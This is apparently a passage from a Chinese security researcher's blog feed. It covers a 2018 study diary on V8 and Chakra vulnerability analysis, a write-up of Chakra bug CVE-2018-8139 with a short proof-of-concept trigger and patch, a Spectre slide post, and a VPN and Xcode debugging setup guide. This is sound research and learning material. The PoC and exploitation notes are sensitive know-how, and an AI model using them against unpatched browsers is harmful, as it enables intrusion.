title="2018-5-3"></a>2018-5-3</h2><ol><li>下午在看书，然后突然接了玄武的面试，患得患失吧，之前面试都没这种感觉，可能是因为，玄武是我从刚学二进制，就一直梦想能去的地方。</li><li>总结一下面试：<br>CTF和内核这种充数的不算，好歹面的是浏览器组。<br>主要是讲了v8的一个洞，然后oob有一个点没分析清楚，我需要透彻的再搞一下了，还是太菜。<br>感谢给我讲了这个点的sky师傅，面的时候被问到这里真心紧张了。<br>面了45分钟，口干舌燥，最后我提问的时候，问了自己读浏览器源码的方法是否合适，万分期望能过。<br>也问了我对各种缓解机制的了解，然后就是漏洞利用，我讲的每一个洞，都被问了怎么利用，这个答的太差了，真的只是说说思路了，自己搞，写exp，真的没试过……该提升这方面的技能了，不能停滞不前！</li><li>CTF暂时不玩了，在拿到offer之前。</li></ol><h2 id="2018-5-4"><a href="#2018-5-4" class="headerlink" title="2018-5-4"></a>2018-5-4</h2><ol><li>webkit技术内幕里关于v8有一些描述，有一些帮助。</li><li>理解了一下原型链是什么。</li></ol><h2 id="2018-5-5-9"><a href="#2018-5-5-9" class="headerlink" title="2018-5-5-9"></a>2018-5-5-9</h2><ol><li>有点忘了自己都做了什么？最近做的东西周期越来越长，分开来看每天都没什么好记的（都是借口……最近太兴奋和激动有点摸鱼）</li><li>玄武实验室的offer拿到了~我最初想要的都有了，以后只需要往着安全研究员和优秀黑客的方向继续努力就行。</li><li>最近有在翻v8的一些日语资料，翻完了会放出来吧，一边看资料一边查资料读slide打基础，还有鲸书准备读。</li></ol><h2 id="2018-5-10"><a href="#2018-5-10" class="headerlink" title="2018-5-10"></a>2018-5-10</h2><ol><li>继续翻v8 exploit的资料，大概翻完了1/3，看到了GC机制那里。</li><li>下午上机组实验太伤脑子了……茶，然后最近准备再调一个v8的oob写wp了，不过还得等等…一样一样来。</li><li>c++有点不熟了呀，还是要再搞搞……</li></ol><h2 id="2018-5-11"><a href="#2018-5-11" class="headerlink" title="2018-5-11"></a>2018-5-11</h2><ol><li>继续翻v8资料，理解引擎很重要，在此基础上调洞比起靠感觉还是要好点的，纯靠感觉容易偏。</li><li>翻完了gc，好像稍微懂一点了。</li><li>今天其实发生了很多事情吧，不过不方便写在日记里，就这样吧。</li></ol><h2 id="2018-5-12"><a href="#2018-5-12" class="headerlink" title="2018-5-12"></a>2018-5-12</h2><ol><li>继续翻v8，总算翻到了对象存储（其实这部分该最先讲吧……）</li><li>准备信息系统开发的答辩什么的，下周开始要准备复习功课了。</li></ol><h2 id="2018-5-13-14"><a href="#2018-5-13-14" class="headerlink" title="2018-5-13-14"></a>2018-5-13-14</h2><ol><li>今天把v8的ppt的引擎基础部分翻完了，入职的事情也都搞的差不多了，剩下就是在去之前好好努力了。</li><li>感觉路由器这种硬件可以玩玩……相对好挖洞呢。。</li></ol><h2 id="2018-5-15-6-9"><a href="#2018-5-15-6-9" class="headerlink" title="2018-5-15-6-9"></a>2018-5-15-6-9</h2><p>这段时间沉迷期末考试无法自拔？？？嘤嘤嘤<br>有个小插曲，因为弄错了考试时间导致挂科，吃一堑长一智。。回去我就把那个误导我的垃圾学校app日了。。<br>好了，开始记笔记了。</p><h2 id="2018-6-10-11"><a href="#2018-6-10-11" class="headerlink" title="2018-6-10-11"></a>2018-6-10-11</h2><p>把v8 exploit的PPT翻译收了个尾，重新整理了下v8的学习思路。<br>从漏洞函数回溯调用路径，断点调试等，还有exp的常用思路。</p><h2 id="2018-6-12-14"><a href="#2018-6-12-14" class="headerlink" title="2018-6-12-14"></a>2018-6-12-14</h2><p>最近脚上起了个小疮去了两趟医院，走路还好疼，真的是非常不顺利了。</p><h2 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018-6-15"></a>2018-6-15</h2><p>在mac上编译了v8，之前是在win上编译的，不得不说……有个坑点就是在16.04上面，不checkout到旧的分支，是无法编译成功的，耽误了一天。<br>然后认真的研究了一下fast Properties和hidden class，拿gdb打debugprint看了很多东西学习，记笔记记笔记。</p><h2 id="2018-6-16"><a href="#2018-6-16" class="headerlink" title="2018-6-16"></a>2018-6-16</h2><p>翻译了Source to Binary Jounrney of V8 javascript engine<br>categories，get了新知识，v8的体系结构还要多调试理解。<br>另外，再需要啃一本鲸书，理解一下编译优化技术。</p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018-6-17"></a>2018-6-17</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-180229.png" alt="">积累着读了一点PPT<br>突然发现也已经看了和写了，还调试了不少东西了，慢慢的对v8从生疏到开始渐渐熟悉，不过到挖掘漏洞的方法论可能还要再过一段时间吧。<br>毕竟v8代码我都没咋读过，翻翻pipeline.cc了解下Turbofan的一些API</p><h2 id="2018-6-18"><a href="#2018-6-18" class="headerlink" title="2018-6-18"></a>2018-6-18</h2><p>饮鸩止渴的谈恋爱。<br>学习了阅读v8的bytecode，和了解bytecode的生成和解释执行还有to graph的过程</p><h2 id="2018-6-19"><a href="#2018-6-19" class="headerlink" title="2018-6-19"></a>2018-6-19</h2><p>今天开始要复习一点算法呢。<br>学习了v8增加的gdb命令使用,读了<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a><br>真的难懂，看了一下午，没什么头绪。。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-19-115842.jpg" alt=""><br>关于代码生成，Builtins和Runtime还是云里雾里，头疼。<br>写了个小工具来转换unsigned long long和double<br>v8的对象存储又看了一遍。。。结果今天还是没复习算法。。睡觉睡觉。(小可爱毕业了)</p><h2 id="2018-6-20-21"><a href="#2018-6-20-21" class="headerlink" title="2018-6-20-21"></a>2018-6-20-21</h2><p>分手+搬家，寄了一些东西回家，整理了整理书，虽然我看的都是电子书，但是还是存了这么多呀。<br>三年不长，但也不短。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-21-173058.jpg" alt=""><br>晚上收拾了我最后一点东西，把入职需要的材料办完，要走了呢。</p><h2 id="2018-6-22-23"><a href="#2018-6-22-23" class="headerlink" title="2018-6-22-23"></a>2018-6-22-23</h2><p>复习了几道动态规划的算法题，要考试啦。<br>另外最好的消息是迟到了。。只做了十分钟的计算机组成原理居然及格了。。感谢老师，师生情太深了，感动感动。<br>这段时间发生了不少事情，然后让我又想明白了一些事情，这段时间确实，没怎么学的进去，学的并不好。<br>今天看了蛮久的漏洞，不知道其他人是什么样，但是在我最烦最难受的时候，安全研究是最能让我平静下来的一件事情。<br>我喜欢这样，虽然目前很多地方做的并不好，但是可以慢慢学习~<br>写了个case CVE-2016-1646，还有另外一个JIT的洞，有点难懂。</p><h2 id="2018-6-24-25"><a href="#2018-6-24-25" class="headerlink" title="2018-6-24-25"></a>2018-6-24-25</h2><p>调v8一个麻烦就是编译，得想个办法.<br><a href="http://eternalsakura13.com/2018/06/26/v8_environment/">http://eternalsakura13.com/2018/06/26/v8_environment/</a><br>总算是搞定了，最近一些技术文章读的少了，思路不够开阔，学习学习……<br>还有算法考试要到了。。趴桌，继续在看动态规划和贪婪</p><h2 id="2018-6-26"><a href="#2018-6-26" class="headerlink" title="2018-6-26"></a>2018-6-26</h2><p>学习了CVE-2016-5198，原理就是一个JIT优化后，假设每个object都有property(map)，但是如果改变了object，使其没有property，那么继续执行下去就会OOB，利用方式也比较传统，不过还是有几个点不清楚，比如为什么这么修改map的type，ParseInt是怎么回调的，patch应该怎么写，能否寻找到一类问题。<br>都还需要总结（</p><h2 id="2018-6-27-28"><a href="#2018-6-27-28" class="headerlink" title="2018-6-27-28"></a>2018-6-27-28</h2><ol><li>看了一些内核的资料，整理整理，顺便给人鸡汤了一下。。</li><li>刷算法，准备期末。。凉了啊。。</li></ol><h2 id="2018-6-29"><a href="#2018-6-29" class="headerlink" title="2018-6-29"></a>2018-6-29</h2><ol><li>累的要死的一天,飞机晚点了三个小时，卒……</li><li>看了一些资料，学会了如何成为一个合格的安全研究员（打了鸡血</li><li>在mathias这里住下了~New story要开始了</li></ol><h2 id="2018-6-30-7-2"><a href="#2018-6-30-7-2" class="headerlink" title="2018-6-30-7-2"></a>2018-6-30-7-2</h2><ol><li>这两天在忙着入职，装电脑和认识同事。</li><li>和导师说了自己最近在做什么，从tools和Bug study的角度，然后他让我继续搞v8，得偿所愿，不过估计要干活要明天了，说是要分析的洞还没给我。</li><li>[ Browser ]  Microsoft Edge Chakra 引擎 UAF 漏洞分析 (CVE-2018-0946)：<a href="https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3</a></li><li>[ Browser ] CVE-2018-5146<br><a href="http://blogs.360.cn/blog/how-to-kill-a-firefox/" target="_blank" rel="noopener">http://blogs.360.cn/blog/how-to-kill-a-firefox/</a><br>A神之前就说在写一个没有poc的exp，不知道是不是这个洞，突然想到。<br>others（同事写的root cause和exploit，还有怎么用shadow来分析堆，很有意义。</li><li>看了鲸书1-4章，不少熟悉的名词……interesting</li></ol><h2 id="2018-7-3"><a href="#2018-7-3" class="headerlink" title="2018-7-3"></a>2018-7-3</h2><p>刚入职这段时间确实是最宽松的一段时间了，只需要学习就行了，没有什么其他KPI，后面应该就多了。<br>今天分析CVE-2017-0234，不过主要花时间都花在环境搭建上，漏洞触发和分析并不难，或者说还好。</p><h2 id="2018-7-4"><a href="#2018-7-4" class="headerlink" title="2018-7-4"></a>2018-7-4</h2><ol><li>今天把CVE-2017-0234的分析报告初版写完了，掌握了vs和windbg的两种很棒的调试方法，然后在编译v8，算是学到了一点东西，得再加强code review的能力。</li><li>成功在win上编译好了v8，可以玩一下。</li></ol><h2 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018-7-5"></a>2018-7-5</h2><ol><li>0234还要分析第二版，不过还不急，今天在自己分析其他v8的漏洞，一个p2o的洞的利用，思路真是棒，学到了学到了~<br><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></li></ol><h2 id="2018-7-6"><a href="#2018-7-6" class="headerlink" title="2018-7-6"></a>2018-7-6</h2><ol><li>上班摸鱼好几天，今天下午听了各个大佬每周做的事情和科总的分享，觉得要走的路还很长。</li><li>目前的计划：<br>先看一些代码和语言标准；<br>talk和blog（可以看看如何移植v8，并思考其中可能出现的漏洞<br>Firefox的<a href="https://github.com/MozillaSecurity/funfuzz/tree/master/src/funfuzz/js/jsfunfuzz" target="_blank" rel="noopener">fuzz</a>（编译原理不止要领会意义，更要能写出来。<br>另外是关于win下用到了v8的各种软件的调试，也是一个学习面（比如可以看看漏洞战争等资料学习windbg和常规利用）</li></ol><p><strong>你要用较少的时间走完别人走了很久的路，所以你要跑起来，要飞快地跑起来。</strong></p><ol><li>和导师聊过自己分析的第一版漏洞，发现很多问题，我需要更深入的思考。其实安全研究有点像一个侦探游戏，每一行都是线索，我漏掉一点东西就拼不出完整的拼图。（因缺思厅<br>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?<br>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）<br>（去掉边界的代码是三行，代表一个JIT生成的可选项，为什么要这么选？）</li></ul><h2 id="2018-7-7"><a href="#2018-7-7" class="headerlink" title="2018-7-7"></a>2018-7-7</h2><ol><li>今天上午去办了个房卡，一个月4000，押二付一，资产清零2333，其实居住条件就一般啦，只是离公司近，方便加班（摸鱼）</li><li>今天和朋友聚了个餐，以后就全吃公司救济粮了~</li><li>继续看0234，直接挂win API没调到点子上，但是最后还是换了个想法搜到了。。还行。。方向没错。</li><li>思考和调试新的攻击方法，趴桌。</li></ol><h2 id="2018-7-8"><a href="#2018-7-8" class="headerlink" title="2018-7-8"></a>2018-7-8</h2><ol><li>把0234第二版写好了（调试分析昨天已经结束了，今天只是整理文案……）</li><li>然后看c++对象模型，很有意思。</li><li>研究了一下js fuzzer</li><li>继续思考和调试某个洞（或者说软件）的新的攻击方法。</li></ol><h2 id="2018-7-9"><a href="#2018-7-9" class="headerlink" title="2018-7-9"></a>2018-7-9</h2><ol><li>下午就是在部署fuzz和抄代码,然后xx发了个webkit的洞，我看看……还有公司推送了一个dlmalloc的。。都看看</li><li>导师说我写的FUZZ是浪费时间2333，嗯，是这样的，我不用太心急，这就是有人带的好处……很多点能够及时纠正（然后一下午没了2333<br>沿着各个组件，各个组件都出过什么漏洞这个线索去分析好了，人的力量才是无穷大的。<br>嗯，先把思路和相关知识建立起来。</li></ol><h2 id="2018-7-10-11"><a href="#2018-7-10-11" class="headerlink" title="2018-7-10-11"></a>2018-7-10-11</h2><ol><li>在这找test看，<a href="https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/</a></li><li>v8相关的索引，<a href="https://v8.paulfryzel.com/docs/master/index.html" target="_blank" rel="noopener">https://v8.paulfryzel.com/docs/master/index.html</a></li><li>看每天的commit，<a href="https://github.com/v8/v8/commits/master" target="_blank" rel="noopener">https://github.com/v8/v8/commits/master</a></li><li>看gpz的漏洞，每天写一篇分析（当然不可能放出来（逃<br><a href="https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725" target="_blank" rel="noopener">https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725</a></li><li>最近在思考一些个人研究是否要放博客上，仔细想了想还是算了，漏洞理解的思路，比很多东西要宝贵吧。</li></ol><h2 id="2018-7-12"><a href="#2018-7-12" class="headerlink" title="2018-7-12"></a>2018-7-12</h2><ol><li>现在想要挖到洞，想学会漏洞利用，顺便，月乃安利了一个repo,PPP的<a href="https://github.com/theori-io/pwnjs" target="_blank" rel="noopener">https://github.com/theori-io/pwnjs</a></li><li>这两天可能因为一些原因心情异常烦躁，一方面是弱的不行的自己，一方面是想要的更多，哇，真想哭……好了，杂事就不管了，我又不是神，怎么可能面面俱到。</li><li>闭关，博客会更新日记，在有一定系统化的总结思路之前，博客不会再更新文章了（日更变月更？）</li></ol><h2 id="2018-7-13"><a href="#2018-7-13" class="headerlink" title="2018-7-13"></a>2018-7-13</h2><p>今天开了个组会，可以说是非常开心了……<br>每天东看瞎看，没看点有用的东西……（发呆</p><p>然后导师给了我下一版要继续分析清楚的点。</p><ol><li>VritualAlloc分配的和GC管理的区别，GC机制</li><li>开发者为什么这么设计这个？为什么之前不限制4GB<br>（明明超过4GB就会OOB，为什么还去掉上界，他们就真的是觉得4GB足够大？其实不是；patch补的其实是没问题的，虽然依然可以dos，但是这个不是大问题，应该还是要从GC的角度去再思考一下，或者其他？）</li><li>这个内存管理是实现有问题还是设计有问题？实现有问题那么还有哪些地方是这么实现的，设计同理。要比开发者更了解他们所写的软件（：<br>安全研究的本质还是回归到对开发者的代码的深层次理解，一层一层的往下深挖，才能挖到线索，挖到真相（</li></ol><p>太菜了太菜了……受不了我自己了……<br>今天的收获是和刘炜师傅指点了我好多，一些源码里的疑问搞的清楚了，还解决了其他问题，nice……每天学的都比较痛并快乐着了。</p><h2 id="2018-7-14"><a href="#2018-7-14" class="headerlink" title="2018-7-14"></a>2018-7-14</h2><p>一觉睡到下午一点半……23333，还好周末，不过平常起得也不早，还好在玄武，要不然要被开了……（360打卡<br>然后晚上和川神还有夜影他们约了个饭，感觉还不错~(然后吃完了滚回来加班)<br>今天看了点chakra，分析了cve-2016-7189，用英文写了wp，明天再整理一下pattern（root cause比较好写，只是关于callback我调了一下，挺好玩的）<br>type confused还是很普遍的漏洞，但是其实还是不大好覆盖到每个点去看，有没有什么好思路呢（发呆</p><h2 id="2018-7-15-18"><a href="#2018-7-15-18" class="headerlink" title="2018-7-15-18"></a>2018-7-15-18</h2><p>这几天真的有点懵……或者说有点迷茫，开始搞chakra，代码还是那么难啃，不过比v8好搞多了……<br>关于开发者的假设最后还是弄清楚了，其实就还好，是我分析的时间间隔有点长，没直接串起来，一个宽度问题。<br>在想明白之前觉得自己要被开了，现在还好。<br>今天游走了一天，把zdi的博客上的一些分析看了，有点意思，但是还不够。<br>另外我又要继续分析了。<br>为什么VirtualAlloc比GC更不安全，GC机制。<br>导师让我找几个渲染引擎的老的UAF洞看看~（估计就16年的吧<br>感觉又要踩坑……<br>搭了一个VPN服务器，这样就不用担心v8拉取不下来了……<br><a href="https://cloud.tencent.com/developer/article/1154896" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1154896</a><br>人生苦短我用docker</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018-1-28&quot;&gt;&lt;a href=&quot;#2018-1-28&quot; class=&quot;headerlink&quot; title=&quot;2018-1-28&quot;&gt;&lt;/a&gt;2018-1-28&lt;/h2&gt;&lt;p&gt;1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）&lt;br&gt;2
      
    
    </summary>
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>Vulnerabilities by Lokihardt</title>
    <link href="http://eternalsakura13.com/2018/07/23/Vulnerabilities_by_Lokihardt/"/>
    <id>http://eternalsakura13.com/2018/07/23/Vulnerabilities_by_Lokihardt/</id>
    <published>2018-07-22T18:24:46.389Z</published>
    <updated>2018-07-23T08:38:22.119Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关注更新"><a href="#关注更新" class="headerlink" title="关注更新"></a>关注更新</h3><p><a href="https://github.com/Microsoft/ChakraCore/wiki/Roadmap" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/wiki/Roadmap</a></p><h2 id="v1-8-3"><a href="#v1-8-3" class="headerlink" title="v1.8.3"></a>v1.8.3</h2><h3 id="CVE-2018-8139"><a href="#CVE-2018-8139" class="headerlink" title="CVE-2018-8139"></a>CVE-2018-8139</h3><ul><li>Microsoft Edge: Chakra: A bug in BoundFunction::NewInstance<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1569" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1569</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76</a></li><li><p>PoC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">new</span>.target.x;<span class="comment">//new.target是一个指针，指向哪里？</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = func.bind(&#123;&#125;, <span class="number">1</span>);<span class="comment">//-&gt;boundFunction-&gt;boundArgs[i]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(bound, []);</span><br></pre></td></tr></table></figure></li><li><p>Syntax<br>Reflect.construct<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br></pre></td></tr></table></figure></li></ul><p>不引入newTarget这个可选参数，就和new target(…args)用法一致<br>但是引入的话，就是为了在一些框架里满足一种罕见的需求，也就是要求<strong>用target来初始化实例，但是却要求表现出来的结果是newTarget的实例</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-23-072310.png" alt=""></p><ul><li>root cause<br>漏洞成因是BoundFunction::NewInstance在将参数复制进新的参数数组的时候，没有考虑到CallFlags_ExtraArg这个flag。<br>从patch里可以看到，在patch之后，考虑到了这个flag。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+           <span class="keyword">if</span> (args.HasExtraArg())</span><br><span class="line">+            &#123;</span><br><span class="line">+                newValues[index++] = args.Values[argCount];</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-23-083423.jpg" alt=""><br>然后在真正调用构造函数初始化的时候，就少了一个参数。<br>违反了对参数个数的假设，但是后序产生的逻辑bug，暂时没分析清楚。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;关注更新&quot;&gt;&lt;a href=&quot;#关注更新&quot; class=&quot;headerlink&quot; title=&quot;关注更新&quot;&gt;&lt;/a&gt;关注更新&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Microsoft/ChakraCore/wiki/Roadmap&quot;
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="edge" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/edge/"/>
    
      <category term="chrome" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/edge/chrome/"/>
    
      <category term="safari" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/edge/chrome/safari/"/>
    
    
  </entry>
  
  <entry>
    <title>被“幽灵”困扰的浏览器</title>
    <link href="http://eternalsakura13.com/2018/07/21/kanxue/"/>
    <id>http://eternalsakura13.com/2018/07/21/kanxue/</id>
    <published>2018-07-21T09:07:03.717Z</published>
    <updated>2018-07-21T09:43:52.776Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-091936.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092124.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092223.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092249.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092330.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092420.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092444.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092549.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092615.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092651.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092739.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092800.png" alt=""></p><h3 id="Spectre-in-Browser"><a href="#Spectre-in-Browser" class="headerlink" title="Spectre in Browser"></a>Spectre in Browser</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-092827.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093023.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093134.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093251.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093319.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093333.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093354.png" alt=""></p><h3 id="Real-attack-of-“Spectre”"><a href="#Real-attack-of-“Spectre”" class="headerlink" title="Real attack of “Spectre”"></a>Real attack of “Spectre”</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093508.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093520.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093537.png" alt=""></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-21-093627.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Spectre&quot;&gt;&lt;a href=&quot;#Spectre&quot; class=&quot;headerlink&quot; title=&quot;Spectre&quot;&gt;&lt;/a&gt;Spectre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://onc55v8te.bkt.clouddn.com/2018-07
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>在mac上使用xcode调试v8</title>
    <link href="http://eternalsakura13.com/2018/07/20/v8_xcode/"/>
    <id>http://eternalsakura13.com/2018/07/20/v8_xcode/</id>
    <published>2018-07-20T08:07:44.358Z</published>
    <updated>2018-07-20T09:05:45.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。<br>然后命令行调试还是太太太麻烦了，于是在VPN搭好了之后，就在xcode上干活了。</p><h2 id="搭建VPN并连接"><a href="#搭建VPN并连接" class="headerlink" title="搭建VPN并连接"></a>搭建VPN并连接</h2><p>在之前搭ss的服务器上运行一个vpn的docker(人生苦短，我用docker)<br>直接切换到root然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    --name ipsec-vpn-server \</span><br><span class="line">    --restart=always \</span><br><span class="line">    -e VPN_IPSEC_PSK=你的密码 \</span><br><span class="line">    -e VPN_USER=你的用户名 \</span><br><span class="line">    -e VPN_PASSWORD=你的共享密码（其实和密码填一样就好了，不会弄混） \</span><br><span class="line">    -p 500:500/udp \</span><br><span class="line">    -p 4500:4500/udp \</span><br><span class="line">    -v /lib/modules:/lib/modules:ro \</span><br><span class="line">    -d --privileged \</span><br><span class="line">    hwdsl2/ipsec-vpn-server</span><br></pre></td></tr></table></figure></p><p>连接VPN<br><a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">http://www.vpngate.net/cn/howto_l2tp.aspx</a></p><h2 id="mac上编译"><a href="#mac上编译" class="headerlink" title="mac上编译"></a>mac上编译</h2><p>怎么获取源码，终端编译之前已经写过了，懒得赘述。<br>这里讲一下怎么建立xcode工程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/gn --ide=&quot;xcode&quot;</span><br></pre></td></tr></table></figure></p><p>这样，在out目录下就会有gn文件夹，里面有all.xcworkspace文件，可以直接使用xcode打开这个工作区文件，接下来要设置编译的目标，在Product-&gt;Scheme下选择d8，否则会编译出错，这样就只编译d8这个可执行程序，使用d8就可以直接调试v8的源代码。<br>然后直接Build，编译时间有些长，会自动生成v8的链接库，等待编译完成，在Product-&gt;EditScheme菜单中把poc文件作为运行参数，在对应文件中下好断点，直接运行就会断下来了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>噫，我好像只是教了怎么搭VPN……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>V8 javascript engine代码阅读</title>
    <link href="http://eternalsakura13.com/2018/07/09/zujian/"/>
    <id>http://eternalsakura13.com/2018/07/09/zujian/</id>
    <published>2018-07-09T09:25:34.699Z</published>
    <updated>2018-07-10T03:10:34.891Z</updated>
    
